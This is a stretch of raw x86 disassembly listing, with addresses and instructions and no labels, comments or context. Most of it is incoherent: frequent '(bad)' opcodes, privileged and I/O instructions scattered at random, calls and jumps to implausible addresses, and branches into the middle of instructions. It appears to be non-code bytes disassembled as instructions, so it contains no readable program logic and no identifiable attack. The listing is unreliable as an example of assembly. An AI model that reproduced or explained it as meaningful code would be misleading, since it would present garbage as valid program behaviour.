  432283:	mov    ecx,DWORD PTR [eax]
  432285:	in     al,0x75
  432287:	pop    DWORD PTR [ecx+0x5401]
  43228d:	push   edx
  43228e:	inc    DWORD PTR [ebx]
  432290:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432296:	add    BYTE PTR [edi+0x9],dl
  432299:	call   DWORD PTR [esi]
  43229b:	and    dl,al
  43229d:	and    bh,bh
  43229f:	inc    edi
  4322a1:	test   eax,edx
  4322a3:	sldt   ebx
  4322a6:	xor    al,BYTE PTR [eax]
  4322a8:	pushf  
  4322a9:	(bad)  
  4322aa:	jmp    0x4322b8
  4322ac:	mov    eax,edi
  4322ae:	or     al,0x75
  4322b0:	inc    eax
  4322b1:	call   0x4319b9
  4322b6:	mov    eax,eax
  4322b8:	loopne 0x43223e
  4322ba:	inc    ebp
  4322bb:	add    BYTE PTR [ebx+0x1451c00],cl
  4322c1:	mov    eax,DWORD PTR [ebp+0x20]
  4322c4:	add    edi,ecx
  4322c6:	add    BYTE PTR [eax],ch
  4322c8:	cmp    edi,0x18
  4322cb:	test   DWORD PTR [ebp+0xf],esi
  4322ce:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4322d5:	jne    0x4322d9
  4322d7:	call   0xffa21d9c
  4322dc:	leave  
  4322dd:	rcr    BYTE PTR [esp+eax*4],0x55
  4322e1:	add    ah,ch
  4322e3:	add    BYTE PTR [edi-0x48fef979],dh
  4322e9:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4322f0:	inc    esp
  4322f1:	mov    ebx,DWORD PTR [eax]
  4322f3:	fcom   st(2)
  4322f5:	add    BYTE PTR [edi],bl
  4322f7:	lea    ecx,[eax-0x18]
  4322fa:	(bad)  
  4322fb:	push   DWORD PTR [ecx]
  4322fd:	call   0xffb5705f
  432302:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432306:	fstp   DWORD PTR [esi+ebx*8]
  432309:	push   ebp
  43230a:	pop    ebp
  43230b:	mov    esi,DWORD PTR [edx-0x38]
  43230e:	add    DWORD PTR [eax],0x28
  432311:	mov    edi,DWORD PTR [ebx]
  432313:	xor    esi,DWORD PTR [edx+0x3]
  432316:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43231a:	pop    ebp
  43231b:	or     al,0x4
  43231d:	inc    ecx
  43231e:	push   ebp
  43231f:	(bad)  
  432320:	in     al,dx
  432321:	or     ah,ch
  432323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432324:	xbegin 0xffc8991a
  43232a:	clc    
  43232b:	adc    al,0x45
  43232d:	div    BYTE PTR [edx]
  43232f:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432336:	test   DWORD PTR [ebx+0x666300f8],ebx
  43233c:	add    BYTE PTR [ecx+0x66],dh
  43233f:	add    eax,DWORD PTR [ebp+0x52]
  432342:	adc    eax,0xffffffa0
  432345:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43234b:	test   DWORD PTR [eax],eax
  43234d:	clc    
  43234e:	data16 or al,BYTE PTR [ebp+0x45]
  432352:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432359:	rol    BYTE PTR [ebp+0x45],1
  43235c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432362:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432368:	push   ebx
  432369:	add    BYTE PTR [eax+eax*1+0x51],dl
  43236d:	jge    0x4323a2
  43236f:	add    BYTE PTR [esi+0x4],dl
  432372:	jne    0x4323d9
  432374:	mov    edx,0x457200
  432379:	jmp    0x43233d
  43237b:	xor    edi,DWORD PTR [ebx]
  43237d:	pop    edi
  43237e:	cvtdq2ps xmm7,xmm0
  432381:	ret    0x0
  432384:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43238a:	xor    ecx,DWORD PTR [edi]
  43238c:	add    eax,DWORD PTR [ecx+0x3b]
  43238f:	push   ebx
  432390:	rdpmc  
  432392:	out    0x8d,al
  432394:	add    BYTE PTR [eax],cl
  432396:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43239c:	ret    0x450c
  43239f:	sbb    al,0x8b
  4323a1:	cmp    eax,esi
  4323a3:	or     cl,al
  4323a5:	or     al,0xc2
  4323a7:	pop    eax
  4323a8:	inc    ebp
  4323a9:	add    ecx,DWORD PTR [edi]
  4323ab:	add    esi,DWORD PTR [ebp+0x39]
  4323ae:	invd   
  4323b0:	jge    0x4323bc
  4323b2:	mov    eax,0x478ac0
  4323b7:	cli    
  4323b8:	xor    esp,ecx
  4323ba:	mov    ebx,0x5b8ac0
  4323bf:	ret    0x33
  4323c2:	mov    eax,0x833b8b
  4323c7:	sub    BYTE PTR [ebx],al
  4323c9:	inc    ebp
  4323ca:	xor    ax,di
  4323cd:	pushf  
  4323ce:	inc    bh
  4323d0:	mov    esp,esp
  4323d2:	hlt    
  4323d3:	test   DWORD PTR [ebp-0x8],esi
  4323d6:	mov    eax,DWORD PTR [ebp-0x14]
  4323d9:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4323df:	dec    edi
  4323e0:	or     BYTE PTR [eax],al
  4323e2:	jne    0x43236d
  4323e4:	mov    esi,esp
  4323e6:	call   0x77a9afab
  4323eb:	inc    ebp
  4323ec:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4323f2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4323f8:	add    BYTE PTR [esi+0x7d],ah
  4323fb:	inc    ebp
  4323fc:	mov    bx,WORD PTR [ebp+0x8]
  432400:	add    DWORD PTR [ebp+0x54],0x30c008b
  432407:	inc    ebp
  432408:	mov    bx,di
  43240b:	lock test BYTE PTR [ecx+0x7000801],bh
  432412:	jge    0x4323d5
  432414:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  43241a:	cli    
  43241b:	xor    bl,bh
  43241d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432423:	test   BYTE PTR [eax],cl
  432425:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43242c:	cmp    ebp,eax
  43242e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432435:	test   BYTE PTR [ebp+0x1],bh
  432438:	mov    ebx,0x458a00
  43243d:	xor    esi,DWORD PTR [ebx]
  43243f:	add    esp,DWORD PTR [esi-0x77]
  432442:	pop    ebp
  432443:	loopne 0x4324ab
  432445:	inc    ebp
  432446:	clc    
  432447:	xor    edi,DWORD PTR [ebx]
  432449:	add    esi,DWORD PTR [edx-0x77]
  43244c:	data16 fdivr QWORD PTR [ebp-0x49]
  432450:	mov    ebx,0xb78afc
  432455:	hlt    
  432456:	xor    edi,DWORD PTR [esi+eiz*2]
  432459:	add    BYTE PTR [ebp+0x66],bl
  43245c:	data16 lock clc 
  43245f:	cmp    al,0x3b
  432461:	add    BYTE PTR [edi+0x66],dh
  432464:	psubq  mm7,QWORD PTR [ebp+0x2]
  432468:	ltr    WORD PTR [ebp+0x66]
  43246c:	add    esi,eax
  43246e:	add    di,WORD PTR [ebp+0x2b]
  432472:	data16 data16 jge 0x4324f3
  432476:	mov    ebx,0xe08a8b
  43247b:	jge    0x4324b0
  43247d:	data16 data16 xor al,0x5d
  432481:	data16 data16 jne 0x43247d
  432485:	mov    edi,DWORD PTR [ebx]
  432487:	fdiv   QWORD PTR [edx+0x7d]
  43248a:	data16 data16 jge 0x4324c2
  43248e:	mov    ebx,0x758a66
  432493:	mov    esi,0x667233
  432498:	pop    ebp
  432499:	or     BYTE PTR [esi+0x0],ah
  43249c:	clc    
  43249d:	mov    edi,DWORD PTR [ebx]
  43249f:	lock ja 0x43242d
  4324a2:	(bad)  
  4324a4:	jge    0x43249d
  4324a6:	invd   
  4324a8:	pop    ebp
  4324a9:	add    BYTE PTR [ebx],al
  4324ab:	(bad)  
  4324ac:	cmp    di,WORD PTR [ebp+0xf]
  4324b0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4324b4:	mov    bx,WORD PTR [ebp-0x10]
  4324b8:	pop    bp
  4324ba:	fbstp  TBYTE PTR [ebx]
  4324bc:	test   DWORD PTR [ebx],eax
  4324be:	add    BYTE PTR [ebx],bh
  4324c0:	add    BYTE PTR [esi+0x7d],ah
  4324c3:	jge    0x432450
  4324c5:	data16 in al,dx
  4324c7:	pop    ebp
  4324c8:	stc    
  4324c9:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4324d0:	mov    edi,ebx
  4324d2:	in     al,dx
  4324d3:	test   BYTE PTR [ebp+0x0],bh
  4324d6:	mov    eax,DWORD PTR [eax]
  4324d8:	call   0xbd401e68
  4324dd:	cmp    al,0x9b
  4324df:	add    BYTE PTR [edx],dh
  4324e1:	mov    bx,di
  4324e4:	call   0x8b4ba274
  4324e9:	add    ebp,esp
  4324eb:	mov    bx,di
  4324ee:	jnp    0x432516
  4324f0:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4324f6:	mov    eax,DWORD PTR [eax]
  4324f8:	call   0x7c3eb063
  4324fd:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432503:	data16 data16 fistp WORD PTR [ebp+0xe]
  432508:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  432512:	fisttp WORD PTR [ecx-0x7401f77b]
  432518:	(bad)  
  432519:	cld    
  43251a:	jne    0x432558
  43251c:	xor    eax,DWORD PTR [eax]
  43251e:	mov    esp,DWORD PTR [esi-0x10]
  432521:	sti    
  432522:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432529:	data16 adc bl,bh
  43252c:	push   ebp
  43252d:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432534:	mov    WORD PTR [eax],es
  432536:	fwait
  432537:	data16 xor bh,bl
  43253a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  432540:	mov    esp,DWORD PTR [esi-0x14]
  432543:	fisttp WORD PTR [ebx-0x3748a9f2]
  432549:	or     al,0x2b
  43254b:	mov    bh,0xba
  43254d:	hlt    
  43254e:	mov    bh,bl
  432550:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432556:	dec    esi
  432557:	or     al,0x0
  432559:	mov    edi,DWORD PTR [ebx]
  43255b:	or     BYTE PTR [ebp+0x3b],dh
  43255e:	mov    ecx,DWORD PTR [edi]
  432560:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432566:	xor    al,0xd8
  432568:	pop    bp
  43256a:	lock xor esi,DWORD PTR [ebx]
  43256d:	lea    esp,[esi+0x1f]
  432570:	icebp  
  432571:	jb     0x432577
  432573:	add    al,al
  432575:	jge    0x432583
  432577:	mov    eax,eax
  432579:	fsubr  st,st(3)
  43257b:	pop    ebp
  43257c:	mov    esi,DWORD PTR [ebx]
  43257e:	in     al,0x8d
  432580:	rcr    DWORD PTR [edi],0xc2
  432583:	jb     0x4325e3
  432585:	add    cl,cl
  432587:	jge    0x432595
  432589:	mov    edx,DWORD PTR [ebp-0x20]
  43258c:	in     al,dx
  43258d:	pop    ebp
  43258e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  432593:	cmp    di,WORD PTR [ebp+0x0]
  432597:	mov    ebp,DWORD PTR [ebx]
  432599:	fdivr  QWORD PTR [esi+0x668a5d]
  43259f:	cmp    al,0x33
  4325a1:	mov    si,0x4e7d
  4325a5:	mov    eax,DWORD PTR [eax]
  4325a7:	lock inc ebp
  4325a9:	mov    esi,DWORD PTR [eax]
  4325ab:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4325b2:	clc    
  4325b3:	(bad)  
  4325b4:	cmp    edi,DWORD PTR [ebx]
  4325b6:	je     0x4325c7
  4325b8:	push   ebx
  4325b9:	loopne 0x4325ca
  4325bb:	dec    ecx
  4325bd:	mov    esp,DWORD PTR [ebp-0x1c]
  4325c0:	int    0xf1
  4325c2:	mov    esi,0x703084d
  4325c7:	pcmpgtd mm6,mm1
  4325ca:	add    BYTE PTR [ebp+0x66],dh
  4325cd:	jmp    0x43259a
  4325cf:	mov    eax,DWORD PTR [ebx]
  4325d1:	lock push ebp
  4325d3:	ror    DWORD PTR [ebp-0x2972feb3],1
  4325d9:	or     bh,dl
  4325db:	jb     0x4325db
  4325dd:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4325e3:	loopne 0x4325e5
  4325e5:	jne    0x4325e9
  4325e7:	data16 add BYTE PTR [esi+eiz*2],dh
  4325eb:	mov    ecx,ebx
  4325ed:	data16 cmp al,0xf1
  4325f0:	add    BYTE PTR [esi+eiz*2],bh
  4325f3:	add    bl,cl
  4325f5:	retw   0xf2
  4325f9:	ret    0x66
  4325fc:	retf   
  4325fd:	enterw 0x4df1,0x19
  432602:	pop    edi
  432603:	jne    0x432586
  432605:	mov    esi,DWORD PTR [eax]
  432607:	call   0x77b7b1a8
  43260c:	xor    ebp,DWORD PTR [ebx]
  43260e:	lea    esp,[esi+0x48]
  432611:	repnz in eax,0x3b
  432614:	add    BYTE PTR [ebp-0x37],dh
  432617:	xor    edx,DWORD PTR [ebp-0x15]
  43261a:	in     al,dx
  43261b:	xor    edx,DWORD PTR [esi+0x40]
  43261e:	mov    DWORD PTR [edi],0x338545fc
  432624:	clc    
  432625:	add    esi,DWORD PTR [ecx]
  432627:	pop    edi
  432628:	pushf  
  432629:	pop    ebx
  43262a:	call   0xff4425f1
  43262f:	mov    edi,eax
  432631:	push   ecx
  432632:	pop    es
  432633:	mov    edi,DWORD PTR [eax]
  432635:	push   esi
  432636:	inc    esi
  432637:	add    bh,BYTE PTR [esi+0x0]
  43263a:	popa   
  43263b:	data16 (bad) 
  43263d:	into   
  43263e:	gs cmp al,0xcd
  432641:	add    BYTE PTR [ecx+0x7ce0866],bh
  432647:	ret    0x66
  43264a:	add    bh,al
  43264c:	add    bh,ah
  43264e:	add    BYTE PTR [ebp+0x31c3f866],al
  432654:	cmp    al,0x9c
  432656:	add    BYTE PTR [esi+0x66],ah
  432659:	into   
  43265a:	ret    
  43265b:	pop    ebp
  43265c:	adc    BYTE PTR [edi+0x0],dl
  43265f:	mov    bh,0x66
  432661:	mov    edi,0xff038dc3
  432666:	jne    0x4326bc
  432668:	lea    edx,[ecx+0x1]
  43266b:	mov    ebx,0xd64ff1
  432670:	sar    DWORD PTR [ebx],1
  432672:	test   BYTE PTR [ebp+0x36],dh
  432675:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432679:	push   edi
  43267a:	xor    BYTE PTR [ebx],0x38
  43267d:	mov    esi,ebx
  43267f:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432685:	ss inc ebp
  432687:	fs pop ebx
  432689:	mov    ebx,0x9c3b30
  43268e:	je     0x4326bb
  432690:	xor    edi,DWORD PTR [ebx+0x668a33]
  432696:	mov    WORD PTR [ebx],?
  432698:	ss mov ebx,0x8b4e64
  43269e:	pop    edi
  43269f:	cmp    ecx,ecx
  4326a1:	jne    0x4326f8
  4326a3:	mov    ebp,esp
  4326a5:	cld    
  4326a6:	push   esi
  4326a7:	pop    ebx
  4326a8:	inc    ebp
  4326a9:	stc    
  4326aa:	xor    BYTE PTR [ebp+0x9bef89c],al
  4326b0:	test   esi,ecx
  4326b2:	clc    
  4326b3:	test   dl,dl
  4326b5:	cmp    bh,bh
  4326b7:	fs pop si
  4326ba:	or     bl,al
  4326bc:	add    cl,BYTE PTR [ebx+0x57665100]
  4326c2:	retf   0x3c45
  4326c5:	xor    BYTE PTR [eax],al
  4326c7:	pushf  
  4326c8:	mov    si,0x85ca
  4326cc:	ret    0xf8
  4326cf:	pop    ebx
  4326d0:	dec    dx
  4326d3:	mov    edx,DWORD PTR [edi-0x76]
  4326d6:	push   edi
  4326d7:	add    al,0xb7
  4326d9:	xor    al,0xba
  4326db:	cmp    al,0x8d
  4326dd:	je     0x4326de
  4326df:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4326e3:	lea    edi,[ebx+0x544fff]
  4326e9:	push   ecx
  4326ea:	cmp    edx,DWORD PTR [ebx+0x75]
  4326ed:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4326f3:	add    BYTE PTR [ebx],dh
  4326f5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4326fb:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  432702:	mov    ebx,0x3b3b00
  432707:	jne    0x432734
  432709:	mov    DWORD PTR [ebx+0x728afc],edi
  43270f:	xor    esi,DWORD PTR [ebx]
  432711:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432717:	push   edi
  432718:	cmp    esp,ebp
  43271a:	jne    0x43271c
  43271c:	sbb    DWORD PTR [eax],0x8085c3fc
  432722:	clc    
  432723:	inc    esi
  432724:	pop    ebx
  432725:	sti    
  432726:	add    eax,0xeb8bc075
  43272b:	cld    
  43272c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432732:	mov    ecx,DWORD PTR [ecx+edx*2]
  432735:	rol    DWORD PTR [ebp-0x37],0xf
  432739:	mov    DWORD PTR [eax],ecx
  43273b:	inc    edi
  43273c:	(bad)  
  43273d:	in     eax,0xfe
  43273f:	add    bh,bh
  432741:	(bad)  
  432742:	mov    esi,0xc38a5e
  432747:	mov    esi,DWORD PTR [ebx]
  432749:	push   ecx
  43274a:	mov    edi,0xfc4ec7
  43274f:	test   DWORD PTR [ebp-0x8],edx
  432752:	xor    di,ax
  432755:	pushf  
  432756:	sub    ebp,eax
  432758:	inc    ebp
  432759:	(bad)  
  43275a:	sub    edi,edi
  43275c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432762:	inc    ebp
  432763:	add    BYTE PTR [esi+0x2b],ah
  432766:	or     bh,BYTE PTR [edx+0xf8ac2]
  43276c:	cmp    al,0x33
  43276e:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432774:	(bad)  
  432775:	cmp    esi,DWORD PTR [ebx]
  432777:	je     0x432731
  432779:	push   ebx
  43277a:	dec    esi
  43277b:	str    ecx
  43277e:	cmp    esp,DWORD PTR [ebp+0x75]
  432781:	int    0x33
  432783:	mov    edi,0x789085f
  432788:	mov    edx,DWORD PTR [eax]
  43278a:	cld    
  43278b:	add    cl,cl
  43278d:	data16 add al,0xcb
  432790:	push   ebp
  432791:	add    ebp,esp
  432793:	jne    0x432781
  432795:	(bad)  
  432796:	mov    DWORD PTR [ecx],0xd685f7ec
  43279c:	clc    
  43279d:	xlat   BYTE PTR ds:[ebx]
  43279e:	inc    ebp
  43279f:	mov    esi,DWORD PTR [edx]
  4327a1:	push   eax
  4327a2:	pushf  
  4327a3:	in     eax,0x8b
  4327a5:	add    ah,ch
  4327a7:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4327ab:	add    ax,0x72cb
  4327af:	cmp    al,0x0
  4327b1:	add    BYTE PTR [ebp+0x66],al
  4327b4:	(bad)  
  4327b5:	retf   
  4327b6:	lock ret 0x85
  4327ba:	clc    
  4327bb:	inc    bp
  4327bd:	retf   
  4327be:	cmp    eax,0xc77d9cc8
  4327c3:	xor    ah,bh
  4327c5:	pushf  
  4327c6:	test   DWORD PTR [edi-0x8],ebx
  4327c9:	je     0x432810
  4327cb:	xor    esi,DWORD PTR ds:0x7020840
  4327d1:	ror    BYTE PTR [ebp-0x37],0x8d
  4327d5:	push   ebp
  4327d6:	add    esp,ebp
  4327d8:	jb     0x432765
  4327da:	add    BYTE PTR [eax],cl
  4327dc:	dec    ebp
  4327dd:	mov    bh,0x81
  4327df:	push   esi
  4327e0:	push   esp
  4327e1:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4327e8:	xor    al,BYTE PTR [eax]
  4327ea:	mov    edx,DWORD PTR [edi+0x10]
  4327ed:	(bad)  
  4327ee:	scas   eax,DWORD PTR es:[edi]
  4327ef:	ret    0x3b
  4327f2:	jns    0x3b4424e5
  4327f8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4327fc:	dec    ebp
  4327fd:	or     BYTE PTR [ebx],ch
  4327ff:	ret    0x458b
  432802:	lock jmp 0x4327f6
  432805:	mov    ecx,DWORD PTR [eax]
  432807:	or     BYTE PTR [edi],al
  432809:	mov    ecx,eax
  43280b:	xor    DWORD PTR [edx+0x2],0x0
  43280f:	mov    bh,0xc1
  432811:	adc    BYTE PTR [eax],dh
  432813:	iret   
  432814:	inc    ebp
  432815:	mov    DWORD PTR [ebx],0x4dfff8c4
  43281b:	inc    BYTE PTR [ebx]
  43281d:	ret    0xf8
  432820:	adc    DWORD PTR [esi+0x10],esp
  432823:	clc    
  432824:	dec    ecx
  432825:	fisttp WORD PTR [ecx+0x456604c0]
  43282b:	add    dh,BYTE PTR ds:0x75e0845
  432831:	ret    0x4d
  432834:	lea    ecx,[ebx+0x18728301]
  43283a:	add    BYTE PTR [ebp+0x45],al
  43283d:	xor    ecx,ebp
  43283f:	pushf  
  432840:	add    bh,al
  432842:	add    al,ch
  432844:	inc    ebp
  432845:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43284b:	xor    eax,0x781084d
  432850:	push   esp
  432851:	fwait
  432852:	push   ecx
  432853:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432859:	inc    ebp
  43285a:	cmp    edi,DWORD PTR [ecx]
  43285c:	jbe    0x4327fa
  43285e:	mov    eax,edi
  432860:	or     ah,dh
  432862:	inc    ebp
  432863:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432869:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43286f:	in     al,dx
  432870:	hlt    
  432871:	push   esp
  432872:	push   esp
  432873:	push   ecx
  432874:	push   ecx
  432875:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43287b:	fwait
  43287c:	fwait
  43287d:	xor    dh,BYTE PTR [edx]
  43287f:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432885:	or     BYTE PTR [ebp+0x7],al
  432888:	mov    eax,ecx
  43288a:	clc    
  43288b:	jb     0x43284e
  43288d:	add    BYTE PTR [ebp+0x55],cl
  432890:	or     DWORD PTR [edi],0xc251d154
  432896:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4328a0:	mov    edi,eax
  4328a2:	or     cl,al
  4328a4:	inc    ebp
  4328a5:	dec    ebp
  4328a6:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4328ac:	or     WORD PTR [ecx],0x899b
  4328b1:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4328b7:	mov    edx,DWORD PTR [ecx+0x8]
  4328ba:	mov    eax,DWORD PTR [ebp-0x8]
  4328bd:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4328c4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4328ca:	inc    ebp
  4328cb:	dec    eax
  4328cc:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4328d2:	add    edx,DWORD PTR [ecx-0x8]
  4328d5:	mov    ecx,DWORD PTR [ecx]
  4328d7:	clc    
  4328d8:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4328df:	mov    ecx,ebp
  4328e1:	clc    
  4328e2:	(bad)  
  4328e3:	popf   
  4328e4:	inc    DWORD PTR [eax]
  4328e6:	ret    0x8b
  4328e9:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4328ef:	mov    edi,esp
  4328f1:	hlt    
  4328f2:	test   ecx,esi
  4328f4:	clc    
  4328f5:	or     BYTE PTR [ebp+0x7],al
  4328f8:	xor    al,cl
  4328fa:	pushf  
  4328fb:	jb     0x432930
  4328fd:	add    BYTE PTR [eax-0x3f],al
  432900:	inc    eax
  432901:	daa    
  432902:	inc    ebp
  432903:	inc    ebp
  432904:	xor    eax,0x7f80803
  432909:	dec    ebp
  43290a:	fwait
  43290b:	add    esi,DWORD PTR [edx]
  43290d:	clc    
  43290e:	cmp    DWORD PTR [ecx],ecx
  432910:	or     al,0x8
  432912:	add    al,BYTE PTR [ebp+0x2c]
  432915:	xor    eax,0x7350845
  43291a:	or     BYTE PTR [ebp+0x7],cl
  43291d:	lea    ebx,[ebx-0x748dcdff]
  432923:	add    BYTE PTR [eax*2-0x74b21438],cl
  43292a:	mov    edx,DWORD PTR [eax]
  43292c:	cld    
  43292d:	dec    ebp
  43292e:	push   esp
  43292f:	sub    edx,DWORD PTR [ecx-0x75]
  432932:	add    eax,0xf172fc
  432937:	or     BYTE PTR [ebp+0x7],cl
  43293a:	add    eax,ecx
  43293c:	or     al,0x72
  43293e:	add    DWORD PTR [eax],eax
  432940:	mov    ebx,0x29c2c1
  432945:	inc    ebp
  432946:	mov    eax,DWORD PTR [ebx]
  432948:	cmp    eax,0x3004d1c
  43294e:	xbegin 0x66c8b548
  432954:	clc    
  432955:	or     BYTE PTR [ebp+0x45],al
  432958:	xor    dh,BYTE PTR ds:0x78b089c
  43295e:	adc    BYTE PTR [ebp+0x45],cl
  432961:	lea    eax,[ebp+0x33727501]
  432967:	add    cl,ch
  432969:	inc    ebp
  43296a:	add    bl,ch
  43296c:	add    BYTE PTR [ebx+0x45850845],cl
  432972:	je     0x4328ff
  432974:	push   ebx
  432975:	or     al,0x85
  432977:	dec    ebp
  432978:	std    
  432979:	mov    bh,bh
  43297b:	mov    BYTE PTR [ebp-0x75],al
  43297e:	mov    edi,eax
  432980:	or     al,0x89
  432982:	inc    ebp
  432983:	clc    
  432984:	mov    esp,esp
  432986:	hlt    
  432987:	call   DWORD PTR [edi-0x37]
  43298a:	push   esp
  43298b:	or     al,0x51
  43298d:	push   ebp
  43298e:	xor    ebp,esp
  432990:	mov    esi,0x457251
  432995:	xor    esi,eax
  432997:	pushf  
  432998:	inc    ebp
  432999:	(bad)  
  43299a:	mov    edi,eax
  43299c:	or     al,0x85
  43299e:	add    al,bh
  4329a0:	inc    eax
  4329a2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4329a6:	or     ah,bh
  4329a8:	inc    eax
  4329a9:	push   esp
  4329aa:	jmp    0x4329fd
  4329ac:	mov    eax,DWORD PTR ds:0xe8720c
  4329b2:	mov    DWORD PTR [ebp-0x8],eax
  4329b5:	jne    0x4329fc
  4329b7:	jmp    0x432944
  4329b9:	mov    ebp,DWORD PTR [eax]
  4329bb:	clc    
  4329bc:	retf   0xff54
  4329bf:	push   ecx
  4329c0:	mov    DWORD PTR ds:0x757210,eax
  4329c6:	mov    ecx,DWORD PTR [ebp-0x4]
  4329c9:	sub    esp,DWORD PTR [ebx-0x77]
  4329cc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4329d3:	or     ah,bh
  4329d5:	pop    es
  4329d6:	ds fwait
  4329d8:	push   DWORD PTR [edx]
  4329da:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4329e0:	(bad)  
  4329e1:	mov    bh,bh
  4329e3:	jmp    0x4329d1
  4329e5:	leave  
  4329e6:	jne    0x4329f0
  4329e8:	call   0x302342
  4329ed:	in     al,dx
  4329ee:	dec    ebp
  4329ef:	add    dh,BYTE PTR [ebx]
  4329f1:	add    BYTE PTR [ebx],al
  4329f3:	inc    ebp
  4329f4:	cmp    esi,DWORD PTR [ecx]
  4329f6:	je     0x432994
  4329f8:	mov    eax,edi
  4329fa:	or     al,0xf0
  4329fc:	add    BYTE PTR [ebp+0x458bf845],al
  432a02:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432a08:	adc    al,0x7
  432a0a:	enter  0x9fc0,0xa5
  432a0e:	rol    BYTE PTR [eax],0x5e
  432a11:	mov    ecx,ecx
  432a13:	or     al,0xc
  432a15:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a1c:	jmp    0x432a1d
  432a1e:	push   ebp
  432a1f:	mov    esp,ebp
  432a21:	cld    
  432a22:	inc    ebp
  432a23:	inc    ebp
  432a24:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a2b:	push   esi
  432a2c:	push   esi
  432a2d:	mov    edi,0x7af080f
  432a32:	add    bh,al
  432a34:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432a3a:	add    BYTE PTR [ecx+0x4540100f],cl
  432a40:	mov    ebp,eax
  432a42:	mov    ebp,edi
  432a44:	lock call edx
  432a47:	fcom   DWORD PTR [ebp+0x45]
  432a4a:	mov    eax,0x148a8b
  432a4f:	push   ecx
  432a50:	enter  0xc145,0x83
  432a54:	cmp    ecx,DWORD PTR [eax]
  432a56:	add    BYTE PTR [ebp+0x4d],al
  432a59:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432a5f:	call   0xffa325ce
  432a64:	cmp    eax,DWORD PTR [ebp-0xc]
  432a67:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432a6b:	push   ebp
  432a6c:	(bad)  
  432a6d:	call   0x342871
  432a72:	mov    bh,0xdb
  432a74:	cld    
  432a75:	or     BYTE PTR [ebp+0x45],bl
  432a78:	(bad)  
  432a79:	call   0xff7d2709
  432a7e:	add    al,BYTE PTR [ebp+0x37]
  432a81:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432a87:	jne    0x432a89
  432a89:	(bad)  
  432a8a:	cmp    edi,esp
  432a8c:	jne    0x432abf
  432a8e:	mov    edi,edi
  432a90:	or     BYTE PTR [ebx-0x307f0b49],cl
  432a96:	pop    ds
  432a97:	into   
  432a98:	je     0x432a5b
  432a9a:	mov    ebx,DWORD PTR [esi]
  432a9c:	or     BYTE PTR [ebp-0x49],al
  432a9f:	mov    esp,DWORD PTR [esi-0x77]
  432aa2:	mov    esi,0x2451f0c
  432aa7:	mov    eax,DWORD PTR [eax]
  432aa9:	or     al,0x66
  432aab:	sar    bl,0x3b
  432aae:	xor    esi,DWORD PTR [ebp+0x66]
  432ab1:	xor    ecx,edi
  432ab3:	pop    edi
  432ab4:	adc    bl,BYTE PTR [ebx+0x7e]
  432ab7:	ret    0xff
  432aba:	cld    
  432abb:	inc    ebp
  432abc:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
